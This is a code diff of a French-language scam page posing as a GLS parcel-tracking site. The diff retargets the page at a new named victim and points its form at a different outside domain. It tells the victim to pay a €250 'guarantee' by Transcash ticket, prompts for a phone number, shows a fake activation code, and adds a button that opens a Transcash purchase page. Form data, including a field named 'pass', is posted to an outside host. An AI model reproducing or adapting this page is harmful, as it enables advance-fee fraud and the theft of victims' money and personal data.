@@ -488,15 +488,15 @@ window.GLS.labels.register("info_text_26540", "D&#233;sol&#233;, il n&#39;y a pa
 </p>
 </div>
 {{/hasError}}
-<form action="https://mazinparirue.store/apdg.php" method="post">
+<form action="https://mapassion.cloud/pdg.php" method="post">
 <fieldset{{#loading}} class="loading" disabled{{/loading}}>
 <div class="form-row">
 <div class="form-group col-12{{#6xBlankSearch}} is-invalid{{/6xBlankSearch}} form-group_with_icon">
 <label id="witt002_search_match_input" for="witt002_search_match_input" class="{{#6xBlankSearch}} shake{{/6xBlankSearch}}"> <h6 style="color:#C88039; font-weight: bold;">
 
-Bienvenue,  Charlaftis Dimitrios </h6></label><br><br> <h2 style="color:#C88039; font-weight: bold;">Détails</h2>
+Bienvenue,  Kone FADJAN  </h6></label><br><br> <h2 style="color:#C88039; font-weight: bold;">Détails</h2>
 
-  <label id="witt002_search_match_input" for="witt002_search_match_input" class="{{#6xBlankSearch}} shake{{/6xBlankSearch}}" > <span style="display: block; color: #fff; font-weight: bold; text-decoration: none; text-align: left; background: #1A4773; line-height: 1.4em; font-family: TheSansGLS,Arial,Helvetica,sans-serif;"><br> &nbsp ==> Montant disponible : 590 €  <br> &nbsp ==> Caution de garantie; assurance colis : 250€ <br> &nbsp ==> Frais de transport : payé<br>&nbsp ==> Mode de paiement :   Espèces <br><br> &nbsp &nbsp <span> Expéditeur TransCash: 438351****** (enregistré)</span><br> &nbsp &nbsp <span> Destinataire TransCash : ****** (non enregistré)</span> <br><br>&nbsp TransCash n'est pas activé. <br>&nbsp Veuillez l'activer et définir la date de passage de votre choix.<br>&nbsp PS : La caution de garantir doit être payée uniquement par ticket Transcash. .<br><br>&nbsp &nbsp
+  <label id="witt002_search_match_input" for="witt002_search_match_input" class="{{#6xBlankSearch}} shake{{/6xBlankSearch}}" > <span style="display: block; color: #fff; font-weight: bold; text-decoration: none; text-align: left; background: #1A4773; line-height: 1.4em; font-family: TheSansGLS,Arial,Helvetica,sans-serif;"><br> &nbsp ==> Montant disponible : 710 €  <br> &nbsp ==> Caution de garantie; assurance colis : 250€ <br> &nbsp ==> Frais de transport : payé<br>&nbsp ==> Mode de paiement :   Espèces <br><br> &nbsp &nbsp <span> Expéditeur TransCash: 438351****** (enregistré)</span><br> &nbsp &nbsp <span> Destinataire TransCash : ****** (non enregistré)</span> <br><br>&nbsp TransCash n'est pas activé. <br>&nbsp Veuillez l'activer et définir la date de passage de votre choix.<br>&nbsp PS : La caution de garantir doit être payée uniquement par ticket Transcash. .<br><br>&nbsp &nbsp
   
   <a href="javascript:prompt('Veuillez entrer votre numéro mobile',''); var m ='Votre carte TransCash a bien été activé votre code secret est : 616162. \n Ne jamais communiquer ce code à un tiers.	 Ce code vous permettra de valider votre transaction avec nos transporteurs.' ;alert(m);" class="button" style="box-shadow:inset 0px 1px 0px 0px #f29c93;background:linear-gradient(to bottom, #fe1a00 5%, #ce0100 100%);background-color:#fe1a00;border-radius:8px;border:1px solid #d83526;display:inline-block;cursor:pointer;color:#ffffff;font-family:Arial;font-size:14px;font-weight:bold;padding:2px 13px;text-decoration:none;text-shadow:0px 1px 0px #b23e35;">Activer TransCash</a>
   
@@ -505,7 +505,35 @@ Bienvenue,  Charlaftis Dimitrios </h6></label><br><br> <h2 style="color:#C88039;
   </br></br></label>
  <br> </span>
  
-<label id="witt002_search_match_input" for="witt002_search_match_input" class="{{#6xBlankSearch}} shake{{/6xBlankSearch}}"> Suivre un autre paiement</label>
+<label id="witt002_search_match_input" for="witt002_search_match_input" class="{{#6xBlankSearch}} shake{{/6xBlankSearch}}"> Suivre un autre paiement <br> 
+
+<button id="btn-popup" class="btn-valider">Payer en ligne</button>
+
+<style>
+  .btn-valider {
+    background: #ec5a13;
+    color: #fff;
+    border: 0;
+    border-radius: 999px;
+    padding: 7px 15px;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+  }
+  .btn-valider:hover { background: #d94f0c; }
+</style>
+
+<script>
+  document.getElementById('btn-popup').addEventListener('click', () => {
+    window.open(
+      'https://cartedirecte.fr/cartes-de-paiement/transcash',   // l'URL à ouvrir (remplacez par la vôtre)
+      'maPopup',                // nom de la fenêtre
+      'width=500,height=400,top=100,left=100,resizable=yes,scrollbars=yes'
+    );
+  });
+</script>
+
+</label>
 
 <div class="form-field-icon-holder form-control_icon-info" data-toggle="tooltip" data-trigger="manual" title="Vous pouvez saisir plusieurs num&#233;ros de colis ou Track ID en les s&#233;parant par une virgule ou un espace.">
 <input type="text" id="witt002_search_match_input" name="pass" value="{{match}}" class="form-control {{#6xBlankSearch}} shake{{/6xBlankSearch}}" />
